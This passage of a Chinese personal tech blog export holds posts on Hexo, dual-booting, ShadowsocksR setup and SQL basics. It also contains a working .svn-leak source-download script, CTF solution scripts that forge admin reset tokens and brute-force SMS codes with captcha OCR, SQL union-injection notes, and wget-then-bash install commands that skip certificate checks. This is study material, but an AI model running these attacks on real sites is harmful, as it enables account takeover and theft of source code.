涂黑的地方是你的github ID 接下来执行123hexo ghexo d 或者 hexo deploy 然后会输入github id和密码 输入完成等待上传结束，就可以访问 你的githubID.github,io，看见你的博客了 0x03 写博客 命令比较简单1hexo new &quot;文章题目&quot; 其实是可以在命令行里面写的，但是命令行终究是不是写作的地方，所以也就不学了 直接打开 ./hexo/source/_posts路径下的”文章题目.md” 这是markdown文档，推荐用VScode或者Typora编辑（看自己喜好），有可视化编辑功能，也不用再去下markdownpad破解，写完之后，执行如下代码： hexo clean //清除本地文件夹下的缓存文件和已有的静态文件 hexo g //生成静态文件 hexo s //生成本地站点测试一下 熟练了可以不用 hexo d //部署到云(github)上面 ​ 至于标签云，搜索，归档，时间轴，等功能大多要看着主题帮助文档配置 最后 暂时就学这么多等以后有时间再接着写，接着学]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装多系统]]></title>
    <url>%2F2018%2F08%2F24%2F%E5%AE%89%E8%A3%85%E5%A4%9A%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[安装多系统0x00 准备 系统镜像（最好直接做成启动盘），easyBCD(设定Windows为引导，不是一定需要，可以直接用grub为引导) 0x01 安装Windows 正常安装就行，如果不给kali单独分配整块硬盘的话，注意留出一部分硬盘给kali（40G以上）不要格式化， 如果给kali单独一整块硬盘安装，不格式化此磁盘，安装Windows完成后启动，磁盘管理中设置这块单独给卡里的磁盘为联机状态，这里可能有一个什么选择，选MBR（主引导扇区） 如果已经安装好了Windows可以直接压缩卷弄出一块硬盘就行就可以了 固态加机械好像机械硬盘是主引导扇区，应该是直接压缩一个机械上比较大的盘符就行了 0x02 安装其它系统 关闭Windows，插入软碟通写入U盘的linux（我用的是虚拟机），启动BIOS，设置U盘为第一启动项，启动，如果是单独给一块硬盘安装其他系统，就选择未分配的硬盘安装linux，如果是压缩卷安装就直接选择你压缩卷所在的整块磁盘 接下来就是正常安装linux，有的linux可以检测到你原来的windows，把你原来的系统也放进启动项，没有的话安装完会进入linux系统，然后修改grub2的配置文件 比如Windows7：找到原来的两个启动项的位置添加如下代码重启，在启动引导里面就能看到你的Windows了12345678 menuentry &apos;Windows 7&apos;&#123; insmod part_msdos insmod ntfs insmod ntldr set root=(hd0,1) chainloader +1 boot&#125; 注意，如果要涉及到分区千万别动你原来Windows的分区，删了原来的Windows就没了 可以的话可以留一部分分区为作为共享文件分区，方便在Windows和linux系统之间传文件，有的linux可以识别ntfs有的不能，提前查好资料 多系统也差不多，感觉原理已经基本缕清了，单装其他系统这么久，感觉只有装一次多系统才能体会到什么是MBR，什么是启动引导，文件系统 0x03 关于easyBCD 这个软件企业版是要钱的，个人版不用，这个软件是在grub2前面加一个Windows引导，看起来好看一些，但是问题是如果你在这里选择了linux最后还是会跳到grub2，这。。。感觉有点鸡肋，就当好看可能弄个三系统用得到吧，先攒着万一用得到呢， 用法：创建新条目选择好自己的系统，引导，还有系统的位置，创建就行了（感觉没啥说的，这东西还是比较简单的） 0x04 感受 这个东西不难，会装系统的都可以试试 0x05 补充 其实不论是Windows运行linux应用，还是linux运行Windows都有很多解决方案，双启动虽然兼容性很好，但是切换系统很麻烦，主用Windows可以试试mingW、子系统，或者Windows版的Linux软件（pentextbox）等等，然后主用Linux的可以试试wine、或者安装deb的Windows改成Linux的软件，这些会牺牲掉一部分兼容性，但是总比重启换系统方便一些，如果ip、内存什么的允许的话虚拟机也是不错的选择。]]></content>
      <categories>
        <category>环境配置</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>多系统</tag>
        <tag>装机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于SSR]]></title>
    <url>%2F2018%2F08%2F23%2F%E5%85%B3%E4%BA%8ESSR%2F</url>
    <content type="text"><![CDATA[关于突然大面积更新博客 整理一下以前写的有意思的笔记 搭建SSR 最近呆着没事想尝试搭建shadowsocksR，搭建起来很容易，但调试了好几次才调试的符合心意,分享一下 0x00租服务器 可以在这里租https://www.vultr.com/ 相对便宜 搬瓦工也可以我用的是vultr ，按小时计费感觉对于我这种穷学生来说感觉还是比较划算先充值，可以用支付宝直接付款，也可以银行卡付款 好像是10美金起充，充60多rmb基本可以连续使用两个月，充好钱之后就可以开始选择服务器了地区的话离得近的网速会快一点 还有就是相对用的少的网速会快 据说美国西部的会稳定一些，有的时候选择了其他地区的服务器 ip依然可能是美国广播出去的，比较看脸。我试过东京和新加坡的服务器ip都是美国广播出去的，搭好了ssr后感觉好像快了一点，但ssh连接很不稳定，有的时候卡到连命令都打不了，后来就删了（0.01美元删除重建一次服务器，重建的时候扣费），最终选择了美国西雅图的一个服务器系统选centos6 x64 其他系统理论上也可以实现 但市面上大多一键部署脚本都是针对centos6的，据说centos7防火墙会干扰ssr服务，所以也不建议使用下面有一个IPv6的选项 需要的可以选上，简单科学上网应该也用不到，但是我们学校可以用ipv4转ipv6免流，就要选上选好套餐，直接选择最便宜的，这个东西不会需要太多配置点击创建就可以了等待一小会儿出现下图就算创建成功了 点击这个服务器 这里有服务器的ip，以及root用户密码，然后直接就可以用Xshell连接了，如果连接不上有可能ip被之前用的人封了，这个时候别急着删服务器，先创建一个新的，再删，不然可能还会买到这个ip，如果决定换地区的话就不用管了。 0x01 脚本搭建ssr 这里我用的脚本搭建的，脚本的好处就是一个方便管理，一个方便搭建，不会产生什么组件版本问题之类的。大致过程如下：安装下载命令，有的系统会自带，不过可以输入一下看看有没有更新 yum -y install wget 获取脚本命令，并且赋予脚本执行权限，并且执行脚本1wget -N --no-check-certificate https://softs.fun/Bash/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh 这个命令和这三条命令是一模一样的 12345wget -N --no-check-certificate https://softs.fun/Bash/ssr.shchmod +x ssr.shbash ssr.sh 还有个问题就是这个脚本地址好像失效了,可以点击这里下载 我觉得这个脚本的界面特别人性化，对我这种英语不好的简直就是福利啊，全是中文界面，个人感觉还是比较适合初学者。尤其是多端口、手机卡免流等配置起来极为方便，但如果进行一些高级操作单靠脚本还是不够，还是修改配置文件来的实在 接下来当然是输入1安装ShadowsocksR 弹出输入端口的提示，输入的端口是你自己的设备连接ssr服务器用到的端口，是服务器上的端口，建议输入1024以后的端口 不要和其他服务的端口冲突，不懂的话直接回车默认就好 2333 接下来要输入密码，密码尽量复杂 接下来是输入加密方式，理论上随便选自己记得就行,看了一些教程好像选10的比较多，还有就是这里有几种加密方式比较容易弄混，好多后来连接不上都是这个原因 选择协议 和上面差不多 选一个记住就好 建议选2（参照大佬的选择） 回车默认 记住就好 兼容原版的问题，建议这里输入y，这个应该是ss和ssr的问题 ，建议还是兼容原版，这样出错率低一些 关于混淆，如果要实现手机卡免流的话选2，不需要手机卡免流的话选1、plain速度快一些。如果想都实现可以看一下下面多端口的实现，每个端口可以有不同的配置，这里就随便选就行，手机卡免流需要这个http_simple插件混淆，添加上一些运营商的免流参数，接下来还是输入y 回车 ，兼容原版选上吧，防止出问题。 端口限制：这是输入2333这个端口可以有多少台机器连接不建议太多，防止被别人连接不能第一时间发现,也不建议太少，可能出现连接不上等问题，再然后就是限速，单位是kb/s，自己用的话直接回车（不限速）就好了。，然后就是脚本执行安装ssr服务组件之类的了，过程中会有输Y回车阶段，出现下图配置成功。 这个时候其实就可以用shadowsocksR连接了，但是配置加速，要重启，所以就一并把加速配置了， 还有：这里已经可以用 bash ssr.sh 运行脚本管ssr服务了 0x02 配置BBR加速 个人感觉这个加速效果一般但聊胜于无，锐速的加速好像要钱，也没试过，我搭建这个也不是为了打游戏，所以就讲究着用了 配置很简单，三条命令（也是某大佬的脚本，但我看了几篇博客基本都是这么配的），中间会有几次输入y回车，还有一次重启，断开ssh 12345wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh 稍等一会重新用Xshell连接服务器输入1lsmod | grep bbr 出现如下结果就算配置成功了 0x03 shadowsocksr客户端配置 windows端：https://github.com/shadowsocksrr/shadowsocksr-csharp/releases​ android端：https://github.com/shadowsocksr-backup/shadowsocksr-android/releases​ ios端： Shadowrocket，这个好像要注册国外的apple id才可以买得到、才可以买得到、买得到。。。 mac：ssr客户端貌似有mac版本 客户端最好下载ssr不要下载ss，ss据说容易被发现，ssr在混淆上做了处理不容易被发现 没有ios 也没mac 这里就说一下Windows和android吧 启动shadowsocksR后右下角状态栏会有一个小飞机的标志，单击改服务器配置，右键设置本地，服务器配置不用说，按照配置成功出现那个，有的就填上，没有就空着，本地注意，系统代理模式，选择全局代理或者pac，全局代理就是全都走ssr服务器，pac就是该走的走本地， 遇到墙的走ssr，如果要实现ipv6免流就要用全局，正常的话pac就可以。 在windows设置里面设置好代理 网络和Internet设置-&gt;代理，手动设置代理服务器 使用代理服务器 开，地址127.0.0.1 端口一般1080 这个好像和服务器上的要一致 都配置完了如果是全局代理百度IP就会是你服务器的IP，pac直接上google看看能不能行 注意：上面要用google浏览器查ip，因为不知道为啥google浏览器可以直接走系统代理，其余很多软件都要自己找到配置代理的地方去配置，除非你有下面这个软件 0x04 Profixier实现全局代理 有的软件和浏览器可能出现无法访问代理服务器的问题，这时候就要 和Profixier搭配一起用，有的软件会支持Socks5，但要单独配置，所以还是学着用一下这个软件比较好 中文版：配置文件-&gt;代理服务器-&gt;添加 配置如下 0x05 手机免流问题 android手机连接的时候下载shadowsock和shadowsockR都可以连接，但是要实现免流还是要用 shadowsockR，配置除了混淆参数基本上和电脑差不多，按照终端里面返回成功的信息配置就可以了 注意实现免流要添加免流参数，不同运营商混淆参数不同，具体混淆参数可以参考这位大佬在github的分享 比如我是电信，配置如下，我手机就会走电信爱看流量 0x06 多端口实现 还是运行1bash ssr.sh 9 y 切换到多端口模式然后之前的单端口的所有配置都失效，要从新按照单端口配置一遍，注意这次混淆记得选plain（网速快）,手机免流单独配置一个http_simple的端口就可以了 一切配置完成后，注意把电脑上的混淆设置成plain（我这个排序是不是有点折腾人） 下面说一下这个脚本最大的问题，就是如果这时候运行脚本，选择7 设置 用户配置-&gt;1添加 用户配置，你会发现你添加的所有端口除了密码其余的配置都是相同的，这。。。个人用的话感觉有点鸡肋啊 于是我找了很多大佬的博客终于发现了改配置文件的方法（还是配置文件好用） 多端口模式下执行脚本ssr.sh输入8 编辑配置文件如下添加2334端口混淆是http_simple 注意逗号和引号,保存退出如果编辑不成功就会提示服务启动失败，编辑成功会显示服务启动成功，然后是一堆奇奇怪怪的提示 不用管，记住自己的配置，直接在客户端上面配置就可以了，比如我这个就可以实现电脑速度快，手机免流 0x07 IPV6校园网免流 这个实现看起来比较复杂但其实是最简单的了 上面说到如果要实现校园网免流就要在创建服务器的时候勾选使用IPV6，然后找到自己的ipv6地址直接把windows上的ipv4的地址改成ipv6的地址就可以了，但为了方便就像我这样弄两个，需要的时候右键小飞机—&gt;服务器 切换就可以了如果建立服务器时没有勾选ipv6也没关系， vultr比较人性化的可以在网站上启动ipv6，还有一写帮助文档，帮助你快速修改配置文件，修改好了之后就和开始勾选ipv6一样了 当你用ipv6连接好了之后记得把校园网客户端（Dr，锐捷）在任务管理器里面结束掉，不然还会走校园网 最后 感觉这个当时记得有点啰嗦]]></content>
      <categories>
        <category>环境配置</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[svn泄露利用脚本]]></title>
    <url>%2F2018%2F08%2F21%2Fsvn%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[.svn利用脚本0x00 原理简单解析 和git泄露差不多，有一个/.svn的路径，路径下的pristine/目录储存着web源代码，但是文件名被加密了，找回文件名是利用/.svn路径下的wc.db,利用sqlite3分析得到源文件文件名和pristine/目录下文件的对应位置，然后下载下来就可以了 0x01 送上脚本环境： centos7+python2 12345678910111213141516171819202122232425262728#!/usr/bin/python# -*- coding: UTF-8 -*-import requestsimport commandss = requests.session()url = input(&apos;输入网址（形如：&quot;http://120.132.56.20:1515/&quot;,加引号阔起来）:&apos;)#下载wc.db文件r = s.get(url+&apos;/.svn/wc.db&apos;)with open(&quot;wc.db&quot;, &quot;wb&quot;) as code: code.write(r.content)# 分析数据库 sqlite3 wc.db &apos;select local_relpath, &quot;.svn/pristine/&quot; || substr(checksum,7,2) || &quot;/&quot; || substr(checksum,7) || &quot;.svn-base&quot; as alpha from NODES;&apos;a,b = commands.getstatusoutput(&apos;sqlite3 wc.db \&apos;select local_relpath, &quot;.svn/pristine/&quot; || substr(checksum,7,2) || &quot;/&quot; || substr(checksum,7) || &quot;.svn-base&quot; as alpha from NODES;\&apos;&apos;)# 下载源文件if a == 0: c = b.split(&apos;\n&apos;) for i in c: j = i.split(&apos;|&apos;) if j[0] &lt;&gt; &apos;&apos; and j[1] &lt;&gt; &apos;&apos;: r = s.get(url+&apos;/&apos;+j[1]) fname = j[0].replace(&apos;/&apos;,&apos;_&apos;) code=open(fname,&quot;w&quot;) code.write(r.text) code.close()else: print &quot;系统错误，程序退出&quot; 说明 写完脚本才发现其实并没什么卵用，既然已经分析出了泄露文件名和源文件的对应关系，其实就可以直接去找自己需要的了，没必要全都下载下来，但是，坚持写博客，和试着用程序解决问题是没错的]]></content>
      <categories>
        <category>编程</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
        <tag>svn泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hackinglab做题脚本整理]]></title>
    <url>%2F2018%2F08%2F15%2Fhackinglab%E5%81%9A%E9%A2%98%E8%84%9A%E6%9C%AC%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[php-curl0x00 题目 来源于hcakinglab上的一个题：小明学习代码审计分值: 350小明为了追他心爱的女孩,可谓是绞尽脑汁,天天熬夜好好学习!现在他已经开始学习代码审计,一天,他来到一个电商网站,发现了可爱的程序员竟然写了这样的代码,于是乎,他便重置了管理员密码,买了许多好吃的.通关地址Tips: 该题目模拟真实环境,请不要放过细节.提示不如不提示,Take it easy! 0x01 解题思路 get源码 12345678910111213141516171819202122232425&lt;?php session_start();include &apos;_flag.php&apos;;date_default_timezone_set(&apos;Asia/Shanghai&apos;);if(isset($_POST[&apos;token&apos;]) &amp;&amp; isset($_SESSION[&apos;token&apos;]) &amp;&amp;!empty($_POST[&apos;token&apos;])&amp;&amp;!empty($_SESSION[&apos;token&apos;]))&#123; if($_POST[&apos;token&apos;]==$_SESSION[&apos;token&apos;])&#123; echo &quot;PassResetSuccess! Your Flag is:&quot;.$flag; &#125;else&#123; echo &quot;Token_error!&quot;; &#125;&#125;else&#123; mt_srand(time()); $rand= mt_rand(); $_SESSION[&apos;token&apos;]=sha1(md5($rand)); echo &quot;Token Generate Ok! now send email to your EmailBox!.....&quot;; if(sendmymail($_SESSION[&apos;token&apos;]))&#123; echo &quot;SendOK! \r\n&lt;br&gt; Your password reset Token has been send to your mailbox! &lt;br&gt;Please Check your mail box and fill your token here to reset your password!&lt;br&gt;&quot;; &#125;;&#125;echo &apos;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;token&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/form&gt;&apos;;echo &quot;&lt;!--\r\n&quot;.file_get_contents(__FILE__);?&gt; 分析 上面代码利用time()做随机数种子生成随机数，sha1加密后放入session中的token中，然后和接收的token参数进行比较，相同输出flag，如果用python实现的话比较麻烦，因为python的随机数生成的和php的不一样（至少格式不同），即使同样的随机数种子,考虑直接使用php实现，也可以使用python+php，php写一个生成随机数并加密的网站，python请求这个网站获取随机数，再发送到题目上（渐渐偏离主题） 解题脚本 123456789101112131415161718192021222324252627&lt;?php //准备 $ch = curl_init();//初始化 $cookie = &apos;cookie.txt&apos;;//用于储存cookie 不用提前准备 函数会自己创建文件 date_default_timezone_set(&apos;Asia/Shanghai&apos;);//和题目一样生成随机数 mt_srand(time()); $rand= mt_rand(); //要post发送的数据 $data = array( &apos;token&apos; =&gt; sha1(md5($rand)) ); //发送请求获取cookie curl_setopt()函数可以设置一些参数 curl_exec()执行访问 返回访问结果（html） curl_setopt($ch, CURLOPT_URL, &quot;http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php&quot;);//设置url curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置返回一字符串形式 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);//获取cookie $output = curl_exec($ch); // curl_setopt($ch,CURLOPT_URL,&quot;http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php&quot;); curl_setopt($ch, CURLOPT_POST, 1);//设置post方式访问 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); //使用上面获取的cookie //curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60); //这个应该是延时 curl_setopt($ch, CURLOPT_POSTFIELDS , http_build_query($data));//设置post的数据 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); echo $output; curl_close($ch);//关闭连接?&gt; base64解密0x00 题目 异常数据分值: 200小明今天去妹纸家开Party,而妹纸却给他出了一个谜语,说只要他能答出来,她就会答应小明一个要求.这是妹纸给小明的谜语序列:AGV5IULSB3ZLVSE=Tips:key就是解密结果 0x01 解题 思路 这是一串base64但是把全部小写字母都转换为大写了，只要恢复原来的base64，解密就可以得到flag，而且我在一开始尝试的时候发现把第一个字母改成小写 会解密出hey!B�vKU! ，说明flag中可能存在hey字样综上：我的思路是利用字母不是大写就是小写的特性，和二进制数字非零即一特性进行爆破，解密匹配其中含有hey关键字的显示出来，再人工挑取其中没有乱码的，就是flag。感觉这个脚本还是写的有点灵魂的 ，ahhhhhh 脚本12345678910111213141516171819202122#AGV5IULSB3ZLVSE= 前面的字母大小写随机组合解密base64 有2的十三次方-1 hhh#可以用二进制思想解决就这个题 每次加一 化成二进制对应位上的字母如果是0就大写，1就小写，数字跳过不处理，输出所有key的结果import base64for i in range(65526): miw = &apos;AGV5IULSB3ZLVSE=&apos; cs = len(bin(i)) for j in range(cs-3): if str(bin(i))[cs-j-3]!= &apos;b&apos;:#问题：一开始长度小于16 #判断这一位是1就把miw这一位大写换成小写 if str(bin(i))[cs-j-3] == &apos;1&apos;: if miw[cs-j-5].isupper(): tmp=list(miw) tmp[cs-j-5]=miw[cs-j-5].lower() miw=&apos;&apos;.join(tmp) else: break #解base64 basm = base64.b64decode(miw.encode(&apos;utf-8&apos;)) if &apos;hey!&apos; in str(basm): print(str(basm)) 验证码识别0x00 题目 验证码识别分值: 350验证码识别Tips:验证码依然是3位数通关地址 0x01 解题 思路 这个题是有提示的验证码识别，但是有前面的题的经验，还是有点不死心，用别的方法尝试了好久，但是一直没有结果，最后还是看了一下python的图像识别，发现题目中的这种简单的图像还是挺好识别的,还有就是这个题还有一些工具可以实现（我记得有一个挺多人推崇的工具忘了叫什么） 关于图像识别 12345678910111213141516171819202122232425262728293031323334353637383940# 这个是看一个大佬的教程写的学习图像识别的简单脚本，在使用图像识别之前一定要把所有的库安装好，这个题做有一段时间了，我记得这个安装库文件好像还是稍微有点麻烦的，可以去搜一下教程，避免走弯路from PIL import Imagefrom pytesseract import image_to_string#颜色大于140的置1 小于的置0def initTable(threshold = 140): table = [] for i in range(256): if i&lt; threshold: table.append(0) else: table.append(1) return table#打开图片im = Image.open(&apos;vcode.png&apos;)#减少图片的色彩，化为灰度图im = im.convert(&apos;L&apos;)print(im)#将灰度图二值化binaryImage = im.point(initTable(),&apos;1&apos;)#显示处理过后的图片binaryImage.show()#识别文本 这个config可以根据自己的需要设置 &quot;&quot;&quot;-psm N Set Tesseract to only run a subset of layout analysis and assume a certain form of image. The options for N are: 0 = Orientation and script detection (OSD) only. 1 = Automatic page segmentation with OSD. 2 = Automatic page segmentation, but no OSD, or OCR. 3 = Fully automatic page segmentation, but no OSD. (Default) 4 = Assume a single column of text of variable sizes. 5 = Assume a single uniform block of vertically aligned text. 6 = Assume a single uniform block of text. 7 = Treat the image as a single text line. 8 = Treat the image as a single word. 9 = Treat the image as a single word in a circle. 10 = Treat the image as a single character.&quot;&quot;&quot;print(image_to_string(binaryImage,config=&apos;-psm 7&apos;)) 解题脚本 123456789101112131415161718192021222324252627282930313233import requestsfrom PIL import Imagefrom pytesseract import image_to_string# 图像识别def initTable(threshold = 140): table = [] for i in range(256): if i&lt; threshold: table.append(0) else: table.append(1) return tabledef imagevcode_to_string(url): im = Image.open(url) im = im.convert(&apos;L&apos;) binaryImage = im.point(initTable(),&apos;1&apos;) return image_to_string(binaryImage,config=&apos;-psm 7&apos;)s = requests.session()url = &apos;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/&apos;r = s.get(url)s.post(url+&quot;mobi_vcode.php&quot;,data=&#123;&apos;getcode&apos;:&apos;1&apos;,&apos;mobi&apos;:&apos;13388886666&apos;&#125;)for i in range(100,1000): print(&apos;测试手机验证码：&apos;+str(i)) img = s.get(url+&apos;vcode.php&apos;) with open(&quot;vcode.png&quot;,&apos;wb&apos;) as f: f.write(img.content) j = imagevcode_to_string(&apos;vcode.png&apos;) r = s.post(url+&apos;login.php&apos;,data=&#123;&apos;username&apos;:&apos;13388886666&apos;,&apos;mobi_code&apos;:i,&apos;user_code&apos;:j,&apos;Login&apos;:&apos;submit&apos;&#125;) if &apos;error&apos; not in r.text: print(&apos;正确验证码为：&apos;+str(i)) print(r.text) break 时间戳0x00 题目 以管理员身份登录系统分值: 450以管理员身份登录即可获取通关密码(重置即可，无需登录)通关地址补充说明：假设除了admin用户，其它用户的邮箱都可被登录获取重置密码的链接。 0x01 解题 思路 这个题目上如果是普通用户忘记密码重置密码的时候都会得到一个链接大概这种http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=ff6e09020691aae0eeb48b37ae57cbd9&amp;username=ssssdl，但admin得不到，经过分析sukey是时间戳的md5加密，username是用户名，所以就可构造链接重置admin的密码 解题脚本123456789101112131415161718192021import timeimport requestsimport hashlibimport datetimes = requests.Session()url = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/&apos;r = s.get(url+&apos;index.php&apos;)print(r.text)tm = hashlib.md5()r = s.post(url+&apos;resetpassword.php&apos;,data=&#123;&apos;username&apos;:&apos;admin&apos;&#125;)#获取服务器时间格式Wed, 18 Jul 2018 00:43:24 GMT,t是处理后的时间 注意只有小时前面是0，且加8不会进位的时候生效，其余自己稍微改一下# 这里有一个r.headers[&apos;Date&apos;] 获取服务器时间的t = str(datetime.datetime.now().year)+&quot;-&quot;+str(datetime.datetime.now().month)+&quot;-&quot;+str(datetime.datetime.now().day)+&quot; &quot;+&quot;0&quot;+str(int(r.headers[&apos;Date&apos;][18:19])+8)+&apos;:&apos;+r.headers[&apos;Date&apos;][20:25]timeArray = time.strptime(t, &quot;%Y-%m-%d %H:%M:%S&quot;) timeStamp = int(time.mktime(timeArray)) tm.update(str(timeStamp).encode(&apos;utf-8&apos;))#服务器时间加8个小时urladmin = url+&apos;reset.php?sukey=&apos;+tm.hexdigest()+&apos;&amp;username=admin&apos;print(urladmin)r = s.get(urladmin)print(r.text) 最后 本来打算这些脚本每个写一篇博客的，但是由于本人比较懒。。。。先就这样吧。最后附上本人的进度（¯﹃¯）ctf就是学习和积累的过程 最最后 附上最近发现的一个只有96kb的超级炫酷3D射击大作下载链接 :-)]]></content>
      <categories>
        <category>编程</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>脚本</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql语句基础合集]]></title>
    <url>%2F2018%2F06%2F20%2Fsql%E8%AF%AD%E5%8F%A5%E5%9F%BA%E7%A1%80%E5%90%88%E9%9B%86%2F</url>
    <content type="text"><![CDATA[0x00 大一基础整理 整理一波自己以前用的比较基本的sql语句，还有一些MySQL orcale 数据库的操作， 不包括设置制约关系，触发器等知识（有时间再整理），就是简单的增删改查等操作，整理的比较随意，将就着看 。。。（有时间还会更新）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125mysql -h127.0.0.1 -u用户名 -p密码 本地打开mysql命令行更改密码 update user set authentication_string = PASSWORD(&apos;你自己的密码&apos;) where user=&apos;root&apos;; ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;new_password&apos;; 使设定立即生效 （用于更改密码后） flush privileges; 退出 exit；查询MySQL版本信息 select version();（可以用于判断是否有可以爆信息的information—schema）查询使用者权限或者用户名 select user();查询当前所在的库 select database();显示所有库 show databases;使用某个库 use 库名；显示当前库下的所有表 show tables;创建一个库 create database 库名;删除一个库 drop database text;在当前库下添加一个表，表里有id（整型），username（char字符串型），password（char字符串型） create table 表名(id int, username varchar(20), password varchar(20) );在当前库下的某个表下添加括号里数据 insert into 表名 values(1,’admin’,’123’);要给表添加一列，列名为gender，类型为varchar，长度为2，用如下语句：alter table user add gender varchar(2);查看列：desc 表名;修改表名：alter table t_book rename to bbb;添加列：alter table 表名 add column 列名 varchar(30);删除列：alter table 表名 drop column 列名;修改列名MySQL： alter table bbb change nnnnn hh int;修改列名SQLServer：exec sp_rename&apos;t_student.name&apos;,&apos;nn&apos;,&apos;column&apos;;修改列名Oracle：lter table bbb rename column nnnnn to hh int;修改列属性：alter table t_book modify name varchar(22);删除user表下id=2的数据：delete from user where id=2;DROP DATABASE tutorial_database;如果该数据库tutorial_database不存在，那么你会收到此错误：ERROR 1008 (HY000): Can&apos;t drop database &apos;tutorial_database&apos;; database doesn&apos;t exist为了避免出现此错误使用下面的命令：DROP DATABASE IF EXISTS tutorial_database;查询表下所有信息 select * from 表名; *是一个通配符显示表的字段信息 dasc 表名;一些关键字：@@version_compile_os 服务器系统信息 @@basedir MySQL装在电脑那个目录里 @@datadir 也是和MySQL目录有关的 @@temdir 未知 使用方法：mysql&gt; select *from 表名 where id=-1 and 写一个为真的条件（例如1=1） union select version(),@@version_compile_os,@@datadir;（最多同时查寻数据不得超过表中字段数，剩余的位置用数字填充） 这样会显示出MySQL版本信息，服务器系统信息，MySQL安装目录查询当ID=1时的数据 select * from 表名 where id =1; 查询当id=1时，username,password字段的数据 select username,password from 表名 where id =1; 查询当username=”admin”时，password字段的数据 select password from 表名 where username=”admin”;查询语句 select * from 表名 where id=‘1’and exists(select * from user )；其中exists（）是逐条查询函数，只要表里有信息就返回真。（觉得适用于注入时判断表中是否有信息）判断表中字段条数 order by 数字; 例子：mysql&gt; select *from 表名 where id=1 and 1=1 order by 3;//猜中或者猜小会正常显示 +------+----------+----------+ | id | username | password | +------+----------+----------+ | 1 | admin | 123 | +------+----------+----------+ 1 row in set (0.00 sec) mysql&gt; select *from 表名 where id=1 and 1=1 order by 4;//猜大会报错或者不显示 ERROR 1054 (42S22): Unknown column &apos;4&apos; in &apos;order clause&apos;联合查询把1234等数字放在显示的表中 union select 1,2,3,4,……,n;（n是上一步查询到的字段条数） 例子：mysql&gt; select *from 表名 where id=1 and 1=1 union select 1,2,3; +------+----------+----------+ | id | username | password | +------+----------+----------+ | 1 | admin | 123 | | 1 | 2 | 3 | +------+----------+----------+ 2 rows in set (0.00 sec) 此时把id=1换成id=-1，可以消去第一条数据联合查询显示表中所有信息，使用方法见21 union select 字段，字段，.....，字段 from admin;(前后字段数目必须一致)1、查看mysql版本方法一：status;方法二：select version();2、Mysql启动、停止、重启常用命令a、启动方式1、使用 service 启动：[root@localhost /]# service mysqld start (5.0版本是mysqld)[root@szxdb etc]# service mysql start (5.5.7版本是mysql)2、使用 mysqld 脚本启动：/etc/inint.d/mysqld start3、使用 safe_mysqld 启动：safe_mysqld&amp;b、停止1、使用 service 启动：service mysqld stop2、使用 mysqld 脚本启动：/etc/inint.d/mysqld stop3、mysqladmin shutdownc、重启1、使用 service 启动：service mysqld restartservice mysql restart (5.5.7版本命令)2、使用 mysqld 脚本启动：/etc/init.d/mysqld restartorcale数据库打开服务sqlplus解锁scott用户管理员登录sqlplus(空格)/nologconn sys/password as sysdba解锁scottalter user scott account unlock;修改scott的登录密码：alter user scott identified by tiger;scott登录conn scott/tigerhttps://blog.csdn.net/yali1990515/article/details/51732427 以上是大一的时候自学数据库的时候赞的一些sql语句，感觉有一些还挺有意思的，先这么放着吧，懒得整理。 0x01 大二查询操作通配符 *查询所有列 一般用在列哪里 %百分号代表任意长度字符串，a%b代表以a开头，以b结尾的字符串 _下划线代表一个字符，和%一样用like用于模糊查询之类的，注意数据库字符集为ASCII时一个汉字两个下划线，当字符集为gbk时就只需要一个 不需要通配符，但要输入下划线百分号时用\转义 子句 order by 列名 ASC/DESC 按这一列升序/降序排序 group by 列名 having 条件 按照这一列进行分组返回满足条件的，having可以不用，一般和聚集函数配套使用，列可以是一个也可以是多个 关键字 distinct/all 用在要查询的列名前 distinct去掉这一列重复的数据，默认是all 查询条件where 比较 大于小于等于不等之类的符号 （not） between and 用于确定范围 （not） like 用于字符匹配 （not） in 确定是否再某个集合，一般会用在子查询，或者… in (“1”,”2”) （not） is NULL 判断是否为空值 连接：and or not 聚集函数 count() 查询元祖(*)个数、或者列中值的个数(列名) sum() 计算一列值的总和 avg() 计算一列值的平均值 max() 计算一列值的最大值 min() 计算一列值的最小值 这里的列可以用distinct/all限制，去重复，还有就是除了查询元祖个数，全部跳过空值，聚集函数只等用在select子句和group by 中的having子句中 多表查询 连接查询 例：select stu.*,sc.* from stu,sc where 